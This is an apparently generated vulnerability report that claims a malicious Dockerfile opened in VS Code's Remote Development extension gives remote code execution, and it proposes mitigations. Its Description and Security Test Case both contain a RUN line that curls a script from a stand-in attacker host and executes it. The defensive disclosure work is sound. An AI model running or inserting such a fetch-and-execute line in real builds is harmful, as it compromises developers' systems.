# Vulnerability List

## Malicious Dockerfile Injection Leading to Remote Code Execution (RCE)

### Description
The VS Code Remote Development extension automatically builds and deploys development containers from configuration files (such as the Dockerfiles in `/code/ssh/baseline-configs/fedora/Dockerfile` and `/code/ssh/baseline-configs/fedora+/Dockerfile`).

A threat actor can supply a manipulated repository that includes a modified Dockerfile containing an injected malicious instruction. For example, an attacker may insert an extra `RUN` command that downloads and executes a payload:
  
```
RUN curl -o /tmp/malicious.sh http://attacker.com/malicious.sh && sh /tmp/malicious.sh
```
  
When the victim opens the repository with the Remote Development extension, the extension triggers a container build. Since no validation is performed on the contents of the Dockerfile, the injected command is executed during the build process.

Step by step:
1. The attacker modifies the Dockerfile in the repository to append a malicious command.
2. The victim downloads/opens this repository in VS Code.
3. The extension automatically detects and builds the container from the Dockerfile.
4. The malicious command is executed on the victim's system (or within the container environment), resulting in remote code execution.

### Impact
- Successful exploitation can result in arbitrary command execution within the Docker container.
- If the victim's Docker configuration or privileges are not sufficiently restricted, the attacker may further escalate privileges or pivot from the compromised container to other resources.
- This can lead to compromise of the host system, leakage of sensitive data, or further lateral movement within the network.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
- There is a comment in the Fedora Dockerfile regarding exposure on an isolated Docker network ("# TODO: expose only on an isolated docker network to avoid conflicts?"); however, this is only a note and no real mitigation is implemented.
- No validation, sanitization, or integrity checking of Dockerfile content is observed in the provided project files.

### Missing Mitigations
- **Dockerfile Content Validation:** Implement strict validation and sanitization of user-supplied Dockerfiles before initiating any build process.
- **User Confirmation:** Require explicit user confirmation or review when a Dockerfile from an external repository is to be used for building a container.
- **Sandboxing and Isolation:** Ensure that container builds run in a highly restricted and isolated environment with minimal privileges, so that any malicious behavior is contained.
- **Integrity Verification:** Introduce code-signing or similar integrity verification measures for trusted configuration files used in dev container builds.

### Preconditions
- The victim opens a repository (e.g., a GitHub repo) with the Remote Development extension.
- The repository provided by the attacker has been manipulated to include a Dockerfile with injected malicious commands.
- The extension automatically triggers the container build process without any additional user validation or confirmation that would detect the manipulated file.

### Source Code Analysis
- **Examination of Dockerfiles:**
  - The file `/code/ssh/baseline-configs/fedora/Dockerfile` starts with a base image (`FROM fedora:latest`) and includes commands such as installing OpenSSH server and modifying configuration files using `sed`. It concludes with exposing a port and running the SSH daemon.
  - Similarly, `/code/ssh/baseline-configs/fedora+/Dockerfile` performs akin operations with minor differences.
  - Both files are used as part of the extension's baseline configurations for automated testing and containerized development.
- **Injection Point:**
  - There is no code that verifies or sanitizes the contents of these Dockerfiles before they are used. Therefore, if an attacker appends a malicious `RUN` command, it becomes part of the build instructions.
  - A malicious command inserted into a manipulated Dockerfile will be executed directly when the container is being built, as Docker processes each `RUN` instruction sequentially.
- **Visualization of the Attack Flow:**
  1. **Repository Intake:** Victim acquires repository.
  2. **Automated Build Trigger:** Extension detects dev container configuration (Dockerfile).
  3. **Execution:** Docker build is executed that processes all RUN commands including the malicious one.
  4. **RCE:** Malicious payload is executed.

### Security Test Case
1. **Setup:**
   - Create a modified version of the repository that includes a Dockerfile in one of the baseline configurations (for example, in `/code/ssh/baseline-configs/fedora/Dockerfile`).
   - Append a malicious command at the end of the Dockerfile:
     
     ```
     RUN curl -o /tmp/malicious.sh http://attacker.com/malicious.sh && sh /tmp/malicious.sh
     ```
     
2. **Execution:**
   - Open the manipulated repository in Visual Studio Code with the Remote Development extension enabled.
   - Trigger the dev container build process using the command indicated in the documentation (for example, `devcontainer up --workspace-folder <PATH_TO_CONFIG>`).
3. **Observation:**
   - Monitor the Docker build logs and container output to detect the execution of the malicious command.
   - Check that the payload (e.g., the downloaded script) is executed by verifying changes in the container environment or by using logging/monitoring mechanisms.
4. **Validation:**
   - Confirm that the malicious script execution occurred, thereby validating that the Dockerfile injection leads to remote code execution.
   - Evaluate the environment for any elevated privileges or access beyond the container's sandbox to further assess the potential host impact.